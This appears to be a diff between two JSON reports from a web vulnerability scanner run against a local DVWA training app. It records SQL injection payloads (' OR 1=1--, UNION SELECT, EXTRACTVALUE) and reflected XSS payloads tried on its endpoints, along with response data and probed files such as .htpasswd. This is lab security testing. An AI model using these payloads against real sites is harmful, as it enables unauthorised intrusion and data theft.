@@ -1,6 +1,6 @@
 {
   "target": "http://127.0.0.1:8080",
-  "scan_time": "2026-02-05 17:33:16",
+  "scan_time": "2026-02-07 15:17:59",
   "technologies": {
     "cms": null,
     "language": null,
@@ -8,15 +8,15 @@
     "server": null,
     "javascript_libs": [],
     "headers": {
-      "Date": "Thu, 05 Feb 2026 16:33:16 GMT",
+      "Date": "Sat, 07 Feb 2026 14:17:59 GMT",
       "Server": "Apache/2.4.25 (Debian)",
       "Expires": "Tue, 23 Jun 2009 12:00:00 GMT",
       "Cache-Control": "no-cache, must-revalidate",
       "Pragma": "no-cache",
       "Vary": "Accept-Encoding",
       "Content-Encoding": "gzip",
-      "Content-Length": "2659",
-      "Keep-Alive": "timeout=5, max=96",
+      "Content-Length": "2661",
+      "Keep-Alive": "timeout=5, max=99",
       "Connection": "Keep-Alive",
       "Content-Type": "text/html;charset=utf-8"
     },
@@ -3505,11 +3505,11 @@
     },
     {
       "url": "http://127.0.0.1:8080/vulnerabilities/sqli/",
-      "method": "GET",
+      "method": "POST",
       "parameters": [
         {
           "name": "id",
-          "location": "query",
+          "location": "body",
           "type": "text",
           "required": false,
           "predicted_vulns": [
@@ -3575,7 +3575,7 @@
         },
         {
           "name": "Submit",
-          "location": "query",
+          "location": "body",
           "type": "submit",
           "required": false,
           "predicted_vulns": [
@@ -3646,11 +3646,11 @@
     },
     {
       "url": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
-      "method": "GET",
+      "method": "POST",
       "parameters": [
         {
           "name": "id",
-          "location": "query",
+          "location": "body",
           "type": "text",
           "required": false,
           "predicted_vulns": [
@@ -3716,7 +3716,7 @@
         },
         {
           "name": "Submit",
-          "location": "query",
+          "location": "body",
           "type": "submit",
           "required": false,
           "predicted_vulns": [
@@ -5159,9 +5159,10 @@
   ],
   "forms": [],
   "javascript_files": [
-    "http://127.0.0.1:8080/dvwa/js/dvwaPage.js",
     "http://127.0.0.1:8080/dvwa/js/add_event_listeners.js",
-    "https://www.google.com/recaptcha/api.js"
+    "https://www.google.com/recaptcha/api.js",
+    "http://127.0.0.1:8080/vulnerabilities/javascript/source/medium.js",
+    "http://127.0.0.1:8080/dvwa/js/dvwaPage.js"
   ],
   "api_endpoints": [],
   "interesting_files": [
@@ -5173,15 +5174,15 @@
       "size": 0
     },
     {
-      "url": "http://127.0.0.1:8080/.hta",
-      "path": "/.hta",
+      "url": "http://127.0.0.1:8080/.htpasswd",
+      "path": "/.htpasswd",
       "status": 403,
       "content_type": "text/html; charset=iso-8859-1",
       "size": 0
     },
     {
-      "url": "http://127.0.0.1:8080/.htpasswd",
-      "path": "/.htpasswd",
+      "url": "http://127.0.0.1:8080/.hta",
+      "path": "/.hta",
       "status": 403,
       "content_type": "text/html; charset=iso-8859-1",
       "size": 0
@@ -5207,8 +5208,8 @@
       "payload": "\"",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5439,
-      "timestamp": "17:33:26",
+      "response_length": 5442,
+      "timestamp": "15:18:10",
       "confidence": 75
     },
     {
@@ -5218,8 +5219,8 @@
       "payload": "'",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 5439,
-      "timestamp": "17:33:28",
+      "response_length": 5442,
+      "timestamp": "15:18:12",
       "confidence": 75
     },
     {
@@ -5229,8 +5230,8 @@
       "payload": "' or 1=1 --",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4323,
-      "timestamp": "17:34:08",
+      "response_length": 4332,
+      "timestamp": "15:18:52",
       "confidence": 75
     },
     {
@@ -5240,8 +5241,8 @@
       "payload": "1 or 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4323,
-      "timestamp": "17:34:12",
+      "response_length": 4332,
+      "timestamp": "15:18:55",
       "confidence": 75
     },
     {
@@ -5251,19 +5252,8 @@
       "payload": "1' or '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4323,
-      "timestamp": "17:34:13",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
-      "parameter": "password_conf",
-      "vulnerability_type": "sqli",
-      "payload": "' OR 1=1#",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4269,
-      "timestamp": "17:35:02",
+      "response_length": 4332,
+      "timestamp": "15:18:56",
       "confidence": 75
     },
     {
@@ -5273,8 +5263,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4269,
-      "timestamp": "17:35:02",
+      "response_length": 4278,
+      "timestamp": "15:22:09",
       "confidence": 75
     },
     {
@@ -5284,8 +5274,19 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4269,
-      "timestamp": "17:35:03",
+      "response_length": 4278,
+      "timestamp": "15:22:10",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/csrf/",
+      "parameter": "password_conf",
+      "vulnerability_type": "sqli",
+      "payload": "' OR 1=1#",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4278,
+      "timestamp": "15:22:10",
       "confidence": 75
     },
     {
@@ -5295,8 +5296,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4269,
-      "timestamp": "17:35:05",
+      "response_length": 4278,
+      "timestamp": "15:22:12",
       "confidence": 75
     },
     {
@@ -5306,19 +5307,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4269,
-      "timestamp": "17:35:06",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
-      "parameter": "page",
-      "vulnerability_type": "sqli",
-      "payload": "' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 3244,
-      "timestamp": "17:35:27",
+      "response_length": 4278,
+      "timestamp": "15:22:14",
       "confidence": 75
     },
     {
@@ -5328,8 +5318,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 3244,
-      "timestamp": "17:35:27",
+      "response_length": 3253,
+      "timestamp": "15:22:34",
       "confidence": 75
     },
     {
@@ -5339,8 +5329,19 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 3244,
-      "timestamp": "17:35:28",
+      "response_length": 3253,
+      "timestamp": "15:22:34",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/fi/",
+      "parameter": "page",
+      "vulnerability_type": "sqli",
+      "payload": "' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 3253,
+      "timestamp": "15:22:35",
       "confidence": 75
     },
     {
@@ -5350,8 +5351,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 3244,
-      "timestamp": "17:35:30",
+      "response_length": 3253,
+      "timestamp": "15:22:36",
       "confidence": 75
     },
     {
@@ -5361,8 +5362,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 3244,
-      "timestamp": "17:35:31",
+      "response_length": 3253,
+      "timestamp": "15:22:38",
       "confidence": 75
     },
     {
@@ -5372,8 +5373,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4194,
-      "timestamp": "17:35:51",
+      "response_length": 4203,
+      "timestamp": "15:22:58",
       "confidence": 75
     },
     {
@@ -5383,30 +5384,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4194,
-      "timestamp": "17:35:51",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
-      "parameter": "uploaded",
-      "vulnerability_type": "sqli",
-      "payload": "' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4194,
-      "timestamp": "17:35:53",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
-      "parameter": "uploaded",
-      "vulnerability_type": "sqli",
-      "payload": "1' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4194,
-      "timestamp": "17:35:54",
+      "response_length": 4203,
+      "timestamp": "15:22:58",
       "confidence": 75
     },
     {
@@ -5416,19 +5395,30 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4194,
-      "timestamp": "17:35:56",
+      "response_length": 4203,
+      "timestamp": "15:23:00",
       "confidence": 75
     },
     {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
-      "parameter": "password_new",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
+      "vulnerability_type": "sqli",
+      "payload": "1' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4203,
+      "timestamp": "15:23:01",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/upload/",
+      "parameter": "uploaded",
       "vulnerability_type": "sqli",
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:28",
+      "response_length": 4203,
+      "timestamp": "15:23:03",
       "confidence": 75
     },
     {
@@ -5438,30 +5428,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:28",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
-      "parameter": "password_new",
-      "vulnerability_type": "sqli",
-      "payload": "1 OR 1=1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:30",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
-      "parameter": "password_new",
-      "vulnerability_type": "sqli",
-      "payload": "1' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:32",
+      "response_length": 4724,
+      "timestamp": "15:23:36",
       "confidence": 75
     },
     {
@@ -5471,8 +5439,41 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:33",
+      "response_length": 4724,
+      "timestamp": "15:23:36",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "vulnerability_type": "sqli",
+      "payload": "1 OR 1=1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4724,
+      "timestamp": "15:23:38",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "vulnerability_type": "sqli",
+      "payload": "1' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4724,
+      "timestamp": "15:23:39",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_new",
+      "vulnerability_type": "sqli",
+      "payload": "' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4724,
+      "timestamp": "15:23:41",
       "confidence": 75
     },
     {
@@ -5482,8 +5483,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:42",
+      "response_length": 4724,
+      "timestamp": "15:23:50",
       "confidence": 75
     },
     {
@@ -5493,19 +5494,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:42",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
-      "parameter": "password_conf",
-      "vulnerability_type": "sqli",
-      "payload": "' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:43",
+      "response_length": 4724,
+      "timestamp": "15:23:50",
       "confidence": 75
     },
     {
@@ -5515,8 +5505,19 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:45",
+      "response_length": 4724,
+      "timestamp": "15:23:52",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/captcha/",
+      "parameter": "password_conf",
+      "vulnerability_type": "sqli",
+      "payload": "' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4724,
+      "timestamp": "15:23:53",
       "confidence": 75
     },
     {
@@ -5526,8 +5527,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4715,
-      "timestamp": "17:36:46",
+      "response_length": 4724,
+      "timestamp": "15:23:54",
       "confidence": 75
     },
     {
@@ -5537,8 +5538,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4479,
-      "timestamp": "17:36:58",
+      "response_length": 4617,
+      "timestamp": "15:24:04",
       "confidence": 75
     },
     {
@@ -5548,8 +5549,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4479,
-      "timestamp": "17:36:58",
+      "response_length": 4617,
+      "timestamp": "15:24:05",
       "confidence": 75
     },
     {
@@ -5559,8 +5560,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4479,
-      "timestamp": "17:37:00",
+      "response_length": 4617,
+      "timestamp": "15:24:07",
       "confidence": 75
     },
     {
@@ -5570,8 +5571,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4479,
-      "timestamp": "17:37:00",
+      "response_length": 4617,
+      "timestamp": "15:24:07",
       "confidence": 75
     },
     {
@@ -5581,19 +5582,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4479,
-      "timestamp": "17:37:01",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
-      "parameter": "id",
-      "vulnerability_type": "sqli",
-      "payload": "' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4519,
-      "timestamp": "17:37:13",
+      "response_length": 4617,
+      "timestamp": "15:24:08",
       "confidence": 75
     },
     {
@@ -5603,8 +5593,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4519,
-      "timestamp": "17:37:13",
+      "response_length": 4657,
+      "timestamp": "15:24:20",
       "confidence": 75
     },
     {
@@ -5614,8 +5604,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4519,
-      "timestamp": "17:37:15",
+      "response_length": 4657,
+      "timestamp": "15:24:20",
       "confidence": 75
     },
     {
@@ -5625,8 +5615,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4519,
-      "timestamp": "17:37:15",
+      "response_length": 4657,
+      "timestamp": "15:24:22",
       "confidence": 75
     },
     {
@@ -5636,19 +5626,19 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4519,
-      "timestamp": "17:37:17",
+      "response_length": 4657,
+      "timestamp": "15:24:23",
       "confidence": 75
     },
     {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
-      "parameter": "default",
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/sqli_blind/",
+      "parameter": "id",
       "vulnerability_type": "sqli",
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4808,
-      "timestamp": "17:37:37",
+      "response_length": 4657,
+      "timestamp": "15:24:25",
       "confidence": 75
     },
     {
@@ -5658,8 +5648,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4808,
-      "timestamp": "17:37:38",
+      "response_length": 4817,
+      "timestamp": "15:24:44",
       "confidence": 75
     },
     {
@@ -5669,8 +5659,19 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4808,
-      "timestamp": "17:37:39",
+      "response_length": 4817,
+      "timestamp": "15:24:44",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_d/",
+      "parameter": "default",
+      "vulnerability_type": "sqli",
+      "payload": "' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4817,
+      "timestamp": "15:24:46",
       "confidence": 75
     },
     {
@@ -5680,8 +5681,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4808,
-      "timestamp": "17:37:40",
+      "response_length": 4817,
+      "timestamp": "15:24:47",
       "confidence": 75
     },
     {
@@ -5691,8 +5692,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4808,
-      "timestamp": "17:37:41",
+      "response_length": 4817,
+      "timestamp": "15:24:48",
       "confidence": 75
     },
     {
@@ -5702,8 +5703,8 @@
       "payload": "\"><img src=x onerror=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4385,
-      "timestamp": "17:37:45",
+      "response_length": 4394,
+      "timestamp": "15:24:51",
       "confidence": 75
     },
     {
@@ -5713,52 +5714,8 @@
       "payload": "' onfocus=alert(1) autofocus='",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4385,
-      "timestamp": "17:37:46",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "\"><script>alert(1)</script>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4382,
-      "timestamp": "17:37:47",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<IMG SRC=\"javascript:alert(1);\">",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4387,
-      "timestamp": "17:37:47",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<ScRiPt>alert(1)</sCrIpT>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4380,
-      "timestamp": "17:37:47",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<audio src=x onerror=alert(1)>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4385,
-      "timestamp": "17:37:48",
+      "response_length": 4394,
+      "timestamp": "15:24:52",
       "confidence": 75
     },
     {
@@ -5768,8 +5725,41 @@
       "payload": "<a href=\"javascript:alert(1)\">click</a>",
       "bypass_used": null,
       "response_status": 200,
+      "response_length": 4403,
+      "timestamp": "15:24:53",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "xss",
+      "payload": "<ScRiPt>alert(1)</sCrIpT>",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4389,
+      "timestamp": "15:24:53",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "xss",
+      "payload": "<IMG SRC=\"javascript:alert(1);\">",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4396,
+      "timestamp": "15:24:53",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "xss",
+      "payload": "<audio src=x onerror=alert(1)>",
+      "bypass_used": null,
+      "response_status": 200,
       "response_length": 4394,
-      "timestamp": "17:37:48",
+      "timestamp": "15:24:54",
       "confidence": 75
     },
     {
@@ -5779,8 +5769,8 @@
       "payload": "<body onload=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4377,
-      "timestamp": "17:37:48",
+      "response_length": 4386,
+      "timestamp": "15:24:54",
       "confidence": 75
     },
     {
@@ -5790,8 +5780,8 @@
       "payload": "<details open ontoggle=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4387,
-      "timestamp": "17:37:49",
+      "response_length": 4396,
+      "timestamp": "15:24:55",
       "confidence": 75
     },
     {
@@ -5801,41 +5791,8 @@
       "payload": "<img src=x onerror=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4383,
-      "timestamp": "17:37:49",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<input onfocus=alert(1) autofocus>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4389,
-      "timestamp": "17:37:50",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<marquee onstart=alert(1)>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4381,
-      "timestamp": "17:37:50",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "xss",
-      "payload": "<script>alert(\"XSS\")</script>",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4384,
-      "timestamp": "17:37:50",
+      "response_length": 4392,
+      "timestamp": "15:24:55",
       "confidence": 75
     },
     {
@@ -5845,19 +5802,19 @@
       "payload": "<img src=x onerror=\"alert(1)\">",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4385,
-      "timestamp": "17:37:51",
+      "response_length": 4394,
+      "timestamp": "15:24:55",
       "confidence": 75
     },
     {
       "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
       "parameter": "name",
       "vulnerability_type": "xss",
-      "payload": "<script>alert(1)</script>",
+      "payload": "<input onfocus=alert(1) autofocus>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4380,
-      "timestamp": "17:37:51",
+      "response_length": 4398,
+      "timestamp": "15:24:56",
       "confidence": 75
     },
     {
@@ -5867,8 +5824,8 @@
       "payload": "<svg onload=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4376,
-      "timestamp": "17:37:52",
+      "response_length": 4385,
+      "timestamp": "15:24:57",
       "confidence": 75
     },
     {
@@ -5878,8 +5835,30 @@
       "payload": "<video><source onerror=alert(1)>",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4387,
-      "timestamp": "17:37:52",
+      "response_length": 4396,
+      "timestamp": "15:24:57",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "xss",
+      "payload": "<marquee onstart=alert(1)>",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4390,
+      "timestamp": "15:24:58",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "sqli",
+      "payload": "' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4375,
+      "timestamp": "15:24:59",
       "confidence": 75
     },
     {
@@ -5889,8 +5868,8 @@
       "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4410,
-      "timestamp": "17:37:53",
+      "response_length": 4419,
+      "timestamp": "15:24:59",
       "confidence": 75
     },
     {
@@ -5900,41 +5879,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4364,
-      "timestamp": "17:37:53",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "sqli",
-      "payload": "' OR 1=1--",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4365,
-      "timestamp": "17:37:54",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "sqli",
-      "payload": "' UNION SELECT NULL--",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4376,
-      "timestamp": "17:37:54",
-      "confidence": 75
-    },
-    {
-      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
-      "parameter": "name",
-      "vulnerability_type": "sqli",
-      "payload": "' OR '1'='1",
-      "bypass_used": null,
-      "response_status": 200,
-      "response_length": 4366,
-      "timestamp": "17:37:55",
+      "response_length": 4373,
+      "timestamp": "15:24:59",
       "confidence": 75
     },
     {
@@ -5944,30 +5890,30 @@
       "payload": "' UNION SELECT NULL,NULL--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4381,
-      "timestamp": "17:37:55",
+      "response_length": 4390,
+      "timestamp": "15:25:00",
       "confidence": 75
     },
     {
       "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
       "parameter": "name",
       "vulnerability_type": "sqli",
-      "payload": "1 OR 1=1",
+      "payload": "' UNION SELECT NULL--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4363,
-      "timestamp": "17:37:56",
+      "response_length": 4385,
+      "timestamp": "15:25:00",
       "confidence": 75
     },
     {
       "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
       "parameter": "name",
       "vulnerability_type": "sqli",
-      "payload": "1' OR '1'='1",
+      "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4367,
-      "timestamp": "17:37:57",
+      "response_length": 4374,
+      "timestamp": "15:25:01",
       "confidence": 75
     },
     {
@@ -5977,8 +5923,30 @@
       "payload": "-1 UNION SELECT 1,2,3--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4378,
-      "timestamp": "17:37:57",
+      "response_length": 4387,
+      "timestamp": "15:25:01",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "sqli",
+      "payload": "1 OR 1=1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4372,
+      "timestamp": "15:25:03",
+      "confidence": 75
+    },
+    {
+      "endpoint": "http://127.0.0.1:8080/vulnerabilities/xss_r/",
+      "parameter": "name",
+      "vulnerability_type": "sqli",
+      "payload": "1' OR '1'='1",
+      "bypass_used": null,
+      "response_status": 200,
+      "response_length": 4376,
+      "timestamp": "15:25:03",
       "confidence": 75
     },
     {
@@ -5988,8 +5956,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:08",
+      "response_length": 5001,
+      "timestamp": "15:25:14",
       "confidence": 75
     },
     {
@@ -5999,8 +5967,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:09",
+      "response_length": 5001,
+      "timestamp": "15:25:15",
       "confidence": 75
     },
     {
@@ -6010,8 +5978,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:11",
+      "response_length": 5001,
+      "timestamp": "15:25:17",
       "confidence": 75
     },
     {
@@ -6021,8 +5989,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:12",
+      "response_length": 5001,
+      "timestamp": "15:25:18",
       "confidence": 75
     },
     {
@@ -6032,8 +6000,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:13",
+      "response_length": 5001,
+      "timestamp": "15:25:19",
       "confidence": 75
     },
     {
@@ -6043,8 +6011,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:22",
+      "response_length": 5001,
+      "timestamp": "15:25:28",
       "confidence": 75
     },
     {
@@ -6054,8 +6022,8 @@
       "payload": "' OR 1=1--",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:23",
+      "response_length": 5001,
+      "timestamp": "15:25:29",
       "confidence": 75
     },
     {
@@ -6065,8 +6033,8 @@
       "payload": "1 OR 1=1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:25",
+      "response_length": 5001,
+      "timestamp": "15:25:31",
       "confidence": 75
     },
     {
@@ -6076,8 +6044,8 @@
       "payload": "1' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:26",
+      "response_length": 5001,
+      "timestamp": "15:25:32",
       "confidence": 75
     },
     {
@@ -6087,8 +6055,8 @@
       "payload": "' OR '1'='1",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 4992,
-      "timestamp": "17:38:27",
+      "response_length": 5001,
+      "timestamp": "15:25:33",
       "confidence": 75
     },
     {
@@ -6098,8 +6066,8 @@
       "payload": "' OR 1=1#",
       "bypass_used": null,
       "response_status": 200,
-      "response_length": 8412,
